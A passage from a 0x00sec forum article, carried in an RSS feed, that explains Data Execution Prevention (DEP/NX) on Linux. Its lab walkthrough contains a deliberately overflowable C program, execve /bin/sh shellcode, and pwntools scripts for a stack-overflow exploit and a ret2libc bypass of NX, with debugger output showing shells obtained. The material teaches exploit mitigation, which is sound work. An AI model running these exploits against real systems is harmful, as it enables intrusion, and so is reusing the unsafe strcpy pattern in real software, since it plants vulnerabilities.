When a processor attempts to run code from a not executable marked page an access violation is thrown followed by a control transfer to the operating system for exception handling, resulting in a terminated application. Besides a hardware enforced version of DEP it can also be complemented through software security checks to make better use of implemented exception handling routines.</p>
<p>Overall this technique prevents usage of newly injected code into an applications memory. Even with a proceeded injection of malicious code it cannot be executed anymore as shown later.</p>
<p>DEP was first implemented on Linux based systems by the <a href="https://pax.grsecurity.net/docs/pax.txt">PAX project</a> since <a href="https://lwn.net/Articles/87808/">kernel version 2.6.7</a> in 2004. It makes use of a <em>No eXecute (NX)</em> bit in AMD, and the <em>Execute Disable Bit (XD)</em> in Intel processors on both 32 bit as well as 64 bit architecture.<br>
The counter part for Windows machines was available since Windows XP Service Pack 2 in 2004 as well.</p>
<h2>Limitations</h2>
<p>This directly leads to the weaknesses of data execution prevention. It successfully mitigates basic <a href="http://phrack.org/issues/49/14.html">buffer overflow</a> attacks, but more advanced techniques like <a href="http://ieeexplore.ieee.org/document/1324594/"><strong>return to libc (ret2libc)</strong></a>, <a href="http://ieeexplore.ieee.org/abstract/document/6375725/"><strong>return oriented programming (ROP)</strong></a>, or any other return to known code attacks are not accounted for.<br>
These kind of attacks, often labeled under the term <a href="http://ieeexplore.ieee.org/document/1324594/"><strong>arc injection</strong></a> make up a big percentage of recent bypasses.<br>
They were developments to bypass DEP in particular, which make use of already present code within an application, whose memory pages are marked executable.</p>
<p>Return to libc uses functions and code from the system library glibc, which is linked against almost any binary. It offers a wide area of available functions.</p>
<p>Return oriented programming on the other hand focuses on finding present code snippets from machine code instructions, which chained together create a gadget.<br>
A gadget consists of a few machine code instructions and always ends with a <em>return</em> statement to let the execution return to the abused application before executing the next gadget.<br>
One gadget handles exactly one functionality. Chaining them together to a gadget chain creates an exploit.</p>
<blockquote>
<p>note: <a href="https://dl.acm.org/citation.cfm?id=1866370">It has been shown that not always a real return statement is needed</a>. Instead a function sequence serving as a ‘trampoline’ to transfer control flow is used.</p>
</blockquote>
<h1>PoC</h1>
<p>To make up for the wall of text above we will continue with some elementary show cases, which hopefully will demonstrate the importance of DEP/NX.</p>
<h2>Abusing a DEP/NX disabled binary</h2>
<p>First let’s start abusing a binary, which isn’t hardened at all.</p>
<p>Let’s build a simple vulnerable binary in C ourselves.</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;


char totally_secure(char *arg2[])
{
    char buffer[256];
    printf("What is your name?\n");
    strcpy(buffer, arg2[1]);
    printf("Hello: %s!\n", buffer);
}


int main(int argc, char *argv[])
{
 setvbuf(stdin, 0, 2, 0);
 setvbuf(stdout, 0, 2, 0);
 printf("Hello, I'm your friendly &amp; totally secure binary :)!\n");
 totally_secure(argv);
 return 0;
}
</code></pre>
<p>This code is vulnerable to a buffer overflow in the function totally_secure()</p>
<h3>Compilation and first look at the binary</h3>
<pre><code>$ gcc vuln.c -o vuln_no_prots -fno-stack-protector -no-pie -Wl,-z,norelro -m32 -z execstack
$ echo 0 &gt; /proc/sys/kernel/randomize_va_space
</code></pre>
<p>First look from inside GDB</p>
<pre><code>pwndbg&gt; checksec
[*] '/home/pwnbox/DEP/binary/vuln_no_prots'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

pwndbg&gt;  
</code></pre>
<p>As we can see we’ve got fully disabled exploit mitigation techniques.<br>
Also no ASLR whatsoever.<br>
This is only for the sake of shining some light on this particular technique.<br>
Combinations of exploit mitigation techniques will be covered at a later time.</p>
<h3>Exploit</h3>
<p>A basic overflow is induced by filling the buffer with the following contents:</p>
<pre><code>pwndbg&gt; c
Continuing.
Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB!

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
[─────────────────────────────────────────────────────────────────REGISTERS──────────────────────────────────────────────────────────────────]
*EAX  0x119
 EBX  0x8049838 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804974c (_DYNAMIC) ◂— 1
*ECX  0xffffccd0 ◂— 0x41414141 ('AAAA')
*EDX  0xf7fae870 (_IO_stdfile_1_lock) ◂— 0
 EDI  0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x5d /* 0x1b5db0 */
 ESI  0xffffce20 ◂— 0x2
*EBP  0x41414141 ('AAAA')
*ESP  0xffffcde0 —▸ 0xffffce00 ◂— 0x0
*EIP  0x42424242 ('BBBB')
[───────────────────────────────────────────────────────────────────DISASM───────────────────────────────────────────────────────────────────]
Invalid address 0x42424242
</code></pre>
<p>It shows that we have successfully overwritten the <code>EIP</code> and <code>EBP</code><br>
The executed <a href="http://c9x.me/x86/html/file_module_x86_id_280.html"><code>ret</code></a> instruction took the next value off the stack<br>
and loaded that into the  <code>EIP</code> register (our ‘BBBB’) and then code execution tries to continue from there.<br>
So we can fill the buffer with something like <code>/bin/sh</code> + <code>padding</code>, or try overflowing that position with shell code.<br>
We can craft one ourselves or take an <a href="http://shell-storm.org/shellcode/">already nicely prepared shell code from here</a></p>
<p>In the end I used this one, since it honestly doesn’t make much of a difference at the moment:</p>
<pre><code>46bytes: \x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
</code></pre>
<p>The quick’n’dirty pwntools script:</p>
<pre><code class="lang-python">#!/usr/bin/env python

import argparse
import sys
from pwn import *
from pwnlib import *

context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = '32'
context.log_level = 'DEBUG'

binary = ELF('./binary/vuln_no_prots')


def main():
    parser = argparse.ArgumentParser(description="pwnerator")
    parser.add_argument('--dbg', '-d', action='store_true')
    args = parser.parse_args()

executable = './binary/vuln_no_prots'
payload = '\x90'*222

# shellcode 46 bytes
# 268 bytes - 46 bytes = length of nop sled
payload += '\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b'
payload += '\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'

payload += '\x20\xcd\xff\xff' # stack


if args.dbg:
    r = gdb.debug([executable, payload], gdbscript="""
            b *main
            continue""",
            )
else:
    r = process([executable, payload])
    r.interactive()

if __name__ == '__main__':
    main()
    sys.exit(0)
</code></pre>
<p>Executing the whole payload :</p>
<pre><code>pwnbox@lab:~/DEP$ python bypass_no_prot.py INFO
[*] '/home/pwnbox/DEP/binary/vuln_no_prots'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Starting local process './binary/vuln_no_prots': pid 65330
[*] Switching to interactive mode
Hello, I'm your friendly &amp; totally secure binary :)!
What is your name?
Hello: \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901��F1�1��\x80�[1��C\x07\x89\x89C\x0c\xb0\x0b\x8d\x8dS\x0c̀���\xff\xff/bin/sh ��\xff!
$ whoami
pwnbox
$  
</code></pre>
<p>We successfully continued execution from our stack.<br>
We <em>skipped</em> the <code>NOP</code>-sled and our shell got popped.<br>
We easily achieved code execution<br>
So far so good.</p>
<h2>Bypassing DEP/NX</h2>
<p>Okay so far this was just like any other simple buffer overflow tutorial out there.<br>
Now things get a little more interesting.<br>
We need to craft a new exploit, for the same binary, but this time with DEP/NX enabled.<br>
The exploit from before will not work anymore as shown below.</p>
<p>Our new binary has the following configuration:</p>
<pre><code>gcc vuln.c -o vuln_with_nx -fno-stack-protector -no-pie -Wl,-z,norelro -m32

gdb ./vuln_with_nx

pwndbg&gt; checksec
[*] '/home/pwnbox/DEP/binary/vuln_with_nx'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

pwndbg&gt;
</code></pre>
<p>Executing our payload from before leaves us with this:</p>
<pre><code> python bypass_no_prot.py INFO
[+] Starting local process './binary/vuln_with_nx': pid 65946
[*] Switching to interactive mode
Hello, I'm your friendly &amp; totally secure binary :)!
What is your name?
Hello: \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901��F1�1��\x80�[1��C\x07\x89\x89C\x0c\xb0\x0b\x8d\x8dS\x0c̀���\xff\xff/bin/sh ��\xff!
[*] Got EOF while reading in interactive
$ whoami
[*] Process './binary/vuln_with_nx' stopped with exit code -11 (SIGSEGV) (pid 65946)
[*] Got EOF while sending in interactive
</code></pre>
<p>GDB reveals that something  went wrong:</p>
<pre><code>pwndbg&gt;
0xffffcd20 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
[─────────────────────────────────────────────────────────────────REGISTERS──────────────────────────────────────────────────────────────────]
 EAX  0x119
 EBX  0x69622fff
 ECX  0xffffa7d0 ◂— 0x6c6c6548 ('Hell')
 EDX  0xf7fae870 (_IO_stdfile_1_lock) ◂— 0x0
 EDI  0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b5db0
 ESI  0xffffce50 ◂— 0x2
 EBP  0x68732f6e ('n/sh')
*ESP  0xffffce10 —▸ 0xffffce00 ◂— 0xffffe5e8
*EIP  0xffffcd20 ◂— 0x90909090
[───────────────────────────────────────────────────────────────────DISASM───────────────────────────────────────────────────────────────────]
   0x804851e  &lt;totally_secure+88&gt;    add    esp, 0x10
   0x8048521  &lt;totally_secure+91&gt;    nop    
   0x8048522  &lt;totally_secure+92&gt;    mov    ebx, dword ptr [ebp - 4]
   0x8048525  &lt;totally_secure+95&gt;    leave  
   0x8048526  &lt;totally_secure+96&gt;    ret    
    ↓
 ► 0xffffcd20                        nop    
   0xffffcd21                        nop    
   0xffffcd22                        nop    
   0xffffcd23                        nop    
   0xffffcd24                        nop    
   0xffffcd25                        nop    
[───────────────────────────────────────────────────────────────────STACK────────────────────────────────────────────────────────────────────]
00:0000│ esp  0xffffce10 —▸ 0xffffce00 ◂— 0xffffe5e8
01:0004│      0xffffce14 ◂— 0x0
02:0008│      0xffffce18 ◂— 0x2
03:000c│      0xffffce1c ◂— 0x0
04:0010│      0xffffce20 ◂— 0x2
05:0014│      0xffffce24 —▸ 0xffffcee4 —▸ 0xffffd0c2 ◂— 0x69622f2e ('./bi')
06:0018│      0xffffce28 —▸ 0xffffcef0 —▸ 0xffffd1e9 ◂— 0x4e5f434c ('LC_N')
07:001c│      0xffffce2c —▸ 0xffffce50 ◂— 0x2
[─────────────────────────────────────────────────────────────────BACKTRACE──────────────────────────────────────────────────────────────────]
 ► f 0 ffffcd20
pwndbg&gt;
</code></pre>
<p>We hit the <code>NOP</code>-sled again, so our positioning is correct!<br>
But these memory pages are not getting executed anymore.<br>
The result is a nasty <code>SEGSEGV</code> we do not want…</p>
<p>It’s time for some nifty arc injection!</p>
<h3>ret2libc</h3>
<p>Starting with return to libc</p>
<p>I won’t cover the technique in detail here, since the focus for these articles lies on the defense side of things.<br>
Furthermore we already have multiple challenge and exploit technique writeups, like <a class="mention" href="https://0x00sec.org/u/ioth1nkn0t">@IoTh1nkN0t</a> <a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/">ret2libc</a> article.<br>
So I’m reducing any possible overhead/duplicates.</p>
<blockquote>
<p>note: We’re still paddling in no ASLR waters here. So no advanced ret2libc either. It’s just for demo purposes.</p>
</blockquote>
<p>Basic return to libc approach:</p>
<pre><code>| Top of stack          | EBP      | EIP                                     | Dummy ret addr            | addr of desired shell  |
|-----------------------|----------|-----------------------------------------|---------------------------|------------------------|
| AAAAAAAAAA            | AAAA     | Addr of system func (libc)              | e.g. JUNK                 | e.g.    /bin/sh        |
</code></pre>
<h4>Find libc base:</h4>
<ol>
<li>
<p>Possible way to find linked libc:</p>
<pre><code> ldd vuln_with_nx
     linux-gate.so.1 =&gt;  (0xf7ffc000)
     libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e1d000)         # &lt;- this is it
     /lib/ld-linux.so.2 (0x56555000)
</code></pre>
</li>
<li>
<p>Let’s find the base address of libc via gdb:</p>
<pre><code> pwndbg&gt; vmmap libc
 LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0xf7df7000 0xf7fab000 r-xp   1b4000 0      /lib/i386-linux-gnu/libc-2.24.so     # we want this one
 0xf7fab000 0xf7fad000 r--p     2000 1b3000 /lib/i386-linux-gnu/libc-2.24.so
 0xf7fad000 0xf7fae000 rw-p     1000 1b5000 /lib/i386-linux-gnu/libc-2.24.so
 pwndbg&gt;  
</code></pre>
</li>
</ol>
<h4>find /bin/sh offset:</h4>
<p>Now it’s time to find the <code>/bin/sh</code> in it</p>
<pre><code>strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "bin/sh"
    15fa0f /bin/sh                    # &lt;- this is our offset
</code></pre>
<p>We can assembly the shell location now via <code>base</code> + <code>offset</code>.<br>
It yields: <code>0xf7df7000</code> + <code>15fa0f</code> = <code>0xf7f56a0f</code></p>
<h4>find system</h4>
<pre><code>readelf -s /lib/i386-linux-gnu/libc.so.6 | grep "system"
    246: 00116670    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
    628: 0003b060    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
    1461: 0003b060    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0        # this is our gem
</code></pre>
<p>We can assembly the shell location now via <code>base</code> + <code>offset</code> .<br>
This yields: <code>0xf7df7000</code> + <code>0x3b060</code> = <code>0xf7e32060</code></p>
<p>From here on we can assembly out final exploit.<br>
We got everything we need.<br>
Or we can do the following</p>
<h4>The lazy non ASLR way <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">
</h4>
<p>Print system position:</p>
<pre><code>pwndbg&gt; print system
$1 = {&lt;text variable, no debug info&gt;} 0xf7e32060 &lt;system&gt;
</code></pre>
<p>Search for a shell candidate:</p>
<pre><code>pwndbg&gt; find &amp;system, +99999999,  "/bin/sh"
0xf7f56a0f
warning: Unable to access 16000 bytes of target memory at 0xf7fb8733, halting search.
1 pattern found.
pwndbg&gt;
</code></pre>
<p>This directly results in addresses we can use to craft our exploit</p>
<h4>Final exploit</h4>
<p>Again a quick’n’dirty pwntools script:</p>
<pre><code class="lang-python">#!/usr/bin/env python

import argparse
import sys
from pwn import *
from pwnlib import *

context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = '32'
context.log_level = 'DEBUG'

binary = ELF('./binary/vuln_with_nx')
libc = ELF('/lib/i386-linux-gnu/libc-2.24.so')


def main():
    parser = argparse.ArgumentParser(description='pwnage')
    parser.add_argument('--dbg', '-d', action='store_true')
    args = parser.parse_args()

    executable = './binary/vuln_with_nx'

    libc_base = 0xf7df7000

    binsh = int(libc.search("/bin/sh").next())
    print("[+] Shell located at offset from libc: %s" % hex(binsh))
    shell_addr = libc_base + binsh
    print("[+] Shell is at address: %s" % hex(shell_addr))
    print("[+] libc.system() has a %s offset from libc" % hex(libc.symbols["system"]))
    system_call = int(libc_base + libc.symbols["system"])
    print("[+] system call is at address: %s" % hex(system_call))

    payload = 'A' * 268
    payload += p32(system_call)
    payload += 'JUNK'
    payload += p32(shell_addr)

    if args.dbg:
        r = gdb.debug([executable, payload],
                        gdbscript="""
                        b *totally_secure+53
                        continue""")
    else:
        r = process([executable, payload])
    r.interactive()

if __name__ == '__main__':
    main()
    sys.exit(0)
</code></pre>
<p>Proof of concept:</p>
<pre><code>python bypass_ret2libc.py INFO
[*] '/DEP/binary/vuln_with_nx'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] '/lib/i386-linux-gnu/libc-2.24.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Shell located at offset from libc: 0x15fa0f
[+] Shell is at address: 0xf7f56a0f
[+] libc.system() has a 0x3b060 offset from libc
[+] system call is at address: 0xf7e32060
[+] Starting local process './binary/vuln_with_nx': pid 65828
[*] Switching to interactive mode
Hello, I'm your friendly &amp; totally secure binary :)!
What is your name?
Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` ��JUNK\x0fj��!
$ whoami
pwnbox
$  
</code></pre>
<p>We successfully bypassed DEP/NX on a fairly recent Ubuntu system with our exploit.<br>
You’re invited to try it out yourselves.</p>
<blockquote>
<p>note: Remember, it all depends on your specific libc library to work.</p>
</blockquote>
<h3>ROP</h3>
<p>Initially return to known code attacks like <code>ret2libc</code> were developed to bypass DEP/NX on systems.<br>
Generally all arc injection attacks can bypass DEP/NX and <code>ROP</code> might just be considered a ret2libc alternative/powerup. Hence it can be obviously used here too.<br>
We will come back to ROP in a later article.</p>
<h1>Conclusion</h1>
<p>This small overview showed the effectiveness and struggles DEP/NX brings to the table.<br>
It can be said that the introduction of this approach tried to fight against one of <em>the</em> most exploited vulnerability types out there.<br>
Initially it was very effective, but smart ways around were found with arc injection approaches.</p>
<p>I hope this introduction to the article series was interesting enough to follow.<br>
Feedback is more than welcome, especially if you missed anything while reading this article.<br>
I’ll try my best to incorporate wishes in the next one.</p>
<p>If no voices are raised against this series I’d like to follow up with <strong>stack canaries</strong> as the next topic.</p>
<hr>
<p>Last but not least I’d like some feedback on the article style if you were so kind.<br>
Depending on the result I can adjust my writing style to fit the desired format!</p>
<p><a href="https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634/1">Click to view the poll.</a></p>
<p>Peace out~</p>
          <p><a href="https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634/1</link>
        <pubDate>Tue, 12 Dec 2017 12:06:45 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-4634-1</guid>
        <source url="https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634.rss">Exploit Mitigation Techniques - Data Execution Prevention (DEP)</source>
      </item>
  </channel>
</rss>
